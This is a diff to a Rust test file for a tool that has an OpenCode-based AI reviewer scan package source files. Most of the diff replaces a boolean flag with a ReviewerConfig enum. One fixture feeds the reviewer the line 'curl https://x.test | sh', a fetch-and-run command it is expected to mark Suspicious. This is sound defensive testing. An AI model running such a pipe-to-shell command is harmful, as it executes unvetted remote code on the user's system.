@@ -5,9 +5,9 @@ use std::fs;
 use super::exposure::exposure_in;
 use super::reply::parse_review;
 use super::{
-    AgentError, Exposure, OpenCodeCli, SourceFile, Status, claude_effort, claude_verdict,
-    cli_from_version, opencode_config, review, review_from_json, review_to_json, scan_events,
-    verdict,
+    AgentError, Exposure, OpenCodeCli, ReviewerConfig, SourceFile, Status, claude_effort,
+    claude_verdict, cli_from_version, opencode_config, review, review_from_json, review_to_json,
+    scan_events, verdict,
 };
 use crate::config::model::SourceClass;
 use crate::config::model::{AgentSettings, Thinking};
@@ -339,7 +339,13 @@ fn invokes_opencode_with_tools_denied_and_source_on_stdin() {
         content: "curl https://x.test | sh\n".into(),
     }];
 
-    let result = review(&binary, &render(&files), &AgentSettings::default(), false).unwrap();
+    let result = review(
+        &binary,
+        &render(&files),
+        &AgentSettings::default(),
+        ReviewerConfig::User,
+    )
+    .unwrap();
     assert_eq!(result.status, Status::Suspicious);
 
     let seen = fs::read_to_string(dir.path().join("stdin")).unwrap();
@@ -356,7 +362,15 @@ fn a_reply_without_the_nonce_is_rejected() {
         path: "a.sh".into(),
         content: "true\n".into(),
     }];
-    assert!(review(&binary, &render(&files), &AgentSettings::default(), false).is_err());
+    assert!(
+        review(
+            &binary,
+            &render(&files),
+            &AgentSettings::default(),
+            ReviewerConfig::User
+        )
+        .is_err()
+    );
 }
 
 #[test]
@@ -374,7 +388,7 @@ fn model_and_variant_are_passed_to_opencode() {
         content: "true\n".into(),
     }];
 
-    review(&binary, &render(&files), &settings, false).unwrap();
+    review(&binary, &render(&files), &settings, ReviewerConfig::User).unwrap();
 
     let args = fs::read_to_string(dir.path().join("args")).unwrap();
     let args: Vec<&str> = args.lines().collect();
@@ -393,7 +407,13 @@ fn default_settings_pass_no_model_or_variant() {
         content: "true\n".into(),
     }];
 
-    review(&binary, &render(&files), &AgentSettings::default(), false).unwrap();
+    review(
+        &binary,
+        &render(&files),
+        &AgentSettings::default(),
+        ReviewerConfig::User,
+    )
+    .unwrap();
 
     let args = fs::read_to_string(dir.path().join("args")).unwrap();
     assert!(!args.contains("--model") && !args.contains("--variant"));
@@ -435,7 +455,7 @@ fn opencode_2_runs_standalone_with_the_variant_after_the_model_and_its_own_confi
 
     // A user-level review: OpenCode 2 has no --pure, so it gets a private
     // configuration all the same.
-    let review_result = review(&binary, &render(&files), &settings, false).unwrap();
+    let review_result = review(&binary, &render(&files), &settings, ReviewerConfig::User).unwrap();
     assert_eq!(review_result.status, Status::Clear);
     let args = fs::read_to_string(dir.path().join("args")).unwrap();
     let args: Vec<&str> = args.lines().collect();
@@ -467,7 +487,13 @@ fn opencode_2_runs_standalone_with_the_variant_after_the_model_and_its_own_confi
         variant: Some("high".into()),
         ..AgentSettings::default()
     };
-    let error = review(&binary, &render(&files), &variant_alone, false).unwrap_err();
+    let error = review(
+        &binary,
+        &render(&files),
+        &variant_alone,
+        ReviewerConfig::User,
+    )
+    .unwrap_err();
     let AgentError::Unavailable(error) = error else {
         panic!("expected unavailable, got {error:?}");
     };
@@ -500,7 +526,12 @@ fn opencode_2_failures_count_as_seen_unless_the_provider_had_them() {
     let run = |name: &str, stdout: &str| {
         let dir = TempDir::new(name);
         let binary = mock_opencode2_output(dir.path(), stdout, 1);
-        review(&binary, &render(&files), &AgentSettings::default(), false)
+        review(
+            &binary,
+            &render(&files),
+            &AgentSettings::default(),
+            ReviewerConfig::User,
+        )
     };
     // Typed as the provider's: no model had the request, though OpenCode 2
     // started a step for each attempt.
@@ -541,7 +572,12 @@ fn the_opencode_version_is_asked_once_per_binary_and_with_a_private_configuratio
         content: "true\n".into(),
     }];
     for _ in 0..3 {
-        let _ = review(&binary, &render(&files), &AgentSettings::default(), false);
+        let _ = review(
+            &binary,
+            &render(&files),
+            &AgentSettings::default(),
+            ReviewerConfig::User,
+        );
     }
     let versions = fs::read_to_string(dir.path().join("versions")).unwrap();
     let versions: Vec<&str> = versions.lines().collect();
@@ -570,7 +606,7 @@ fn opencode_2_out_of_time_is_not_an_absent_reviewer() {
         content: "true\n".into(),
     }];
     assert!(matches!(
-        review(&binary, &render(&files), &settings, false),
+        review(&binary, &render(&files), &settings, ReviewerConfig::User),
         Err(AgentError::OutOfTime(_))
     ));
 }
@@ -607,7 +643,13 @@ fn provider_errors_are_unavailable() {
         content: "true\n".into(),
     }];
 
-    let error = review(&binary, &render(&files), &AgentSettings::default(), false).unwrap_err();
+    let error = review(
+        &binary,
+        &render(&files),
+        &AgentSettings::default(),
+        ReviewerConfig::User,
+    )
+    .unwrap_err();
     let AgentError::Unavailable(error) = error else {
         panic!("expected unavailable, got {error:?}");
     };
@@ -617,7 +659,7 @@ fn provider_errors_are_unavailable() {
         std::path::Path::new("/nonexistent/opencode"),
         &render(&files),
         &AgentSettings::default(),
-        false,
+        ReviewerConfig::User,
     );
     assert!(matches!(missing, Err(AgentError::Unavailable(_))));
 }
@@ -631,7 +673,12 @@ fn bad_replies_are_invalid() {
         content: "true\n".into(),
     }];
     assert!(matches!(
-        review(&binary, &render(&files), &AgentSettings::default(), false),
+        review(
+            &binary,
+            &render(&files),
+            &AgentSettings::default(),
+            ReviewerConfig::User
+        ),
         Err(AgentError::NonceMissing)
     ));
     assert!(matches!(
@@ -665,7 +712,7 @@ fn a_tool_attempt_before_a_failed_exit_is_invalid() {
             &binary,
             &render(&one_file()),
             &AgentSettings::default(),
-            false
+            ReviewerConfig::User
         ),
         Err(AgentError::Invalid(_))
     ));
@@ -686,7 +733,7 @@ exit 1"#,
         &binary,
         &render(&one_file()),
         &AgentSettings::default(),
-        false,
+        ReviewerConfig::User,
     )
     .unwrap_err();
     let AgentError::Invalid(error) = error else {
@@ -708,7 +755,7 @@ fn an_error_event_without_output_is_unavailable() {
         &binary,
         &render(&one_file()),
         &AgentSettings::default(),
-        false,
+        ReviewerConfig::User,
     )
     .unwrap_err();
     let AgentError::Unavailable(error) = error else {
@@ -727,7 +774,7 @@ fn no_output_and_a_failed_exit_is_unavailable() {
             &binary,
             &render(&one_file()),
             &AgentSettings::default(),
-            false
+            ReviewerConfig::User
         ),
         Err(AgentError::Unavailable(_))
     ));
@@ -742,7 +789,7 @@ fn a_valid_reply_survives_a_failed_exit_without_an_error_event() {
         &binary,
         &render(&one_file()),
         &AgentSettings::default(),
-        false,
+        ReviewerConfig::User,
     )
     .unwrap();
     assert_eq!(result.status, Status::Clear);
@@ -766,7 +813,13 @@ fn the_pacman_gate_runs_opencode_with_private_config_and_cache() {
         path: "a.sh".into(),
         content: "true\n".into(),
     }];
-    review(&wrapper, &render(&files), &AgentSettings::default(), true).unwrap();
+    review(
+        &wrapper,
+        &render(&files),
+        &AgentSettings::default(),
+        ReviewerConfig::Isolated,
+    )
+    .unwrap();
     let env = fs::read_to_string(dir.path().join("env")).unwrap();
     let lines: Vec<&str> = env.lines().collect();
     assert!(
@@ -781,7 +834,13 @@ fn the_pacman_gate_runs_opencode_with_private_config_and_cache() {
 
     // A user-level review keeps the user's configuration and cache;
     // only the directory it runs in is Guardian's.
-    review(&wrapper, &render(&files), &AgentSettings::default(), false).unwrap();
+    review(
+        &wrapper,
+        &render(&files),
+        &AgentSettings::default(),
+        ReviewerConfig::User,
+    )
+    .unwrap();
     let env = fs::read_to_string(dir.path().join("env")).unwrap();
     let lines: Vec<&str> = env.lines().collect();
     assert!(
@@ -811,14 +870,8 @@ fn opencode_runs_in_an_empty_private_directory_with_its_other_inputs_off() {
         path: "a.sh".into(),
         content: "true\n".into(),
     }];
-    for isolated in [false, true] {
-        review(
-            &wrapper,
-            &render(&files),
-            &AgentSettings::default(),
-            isolated,
-        )
-        .unwrap();
+    for config in [ReviewerConfig::User, ReviewerConfig::Isolated] {
+        review(&wrapper, &render(&files), &AgentSettings::default(), config).unwrap();
         let seen = fs::read_to_string(dir.path().join("seen")).unwrap();
         let lines: Vec<&str> = seen.lines().collect();
         assert!(!lines[0].starts_with("/usr"), "{seen}");
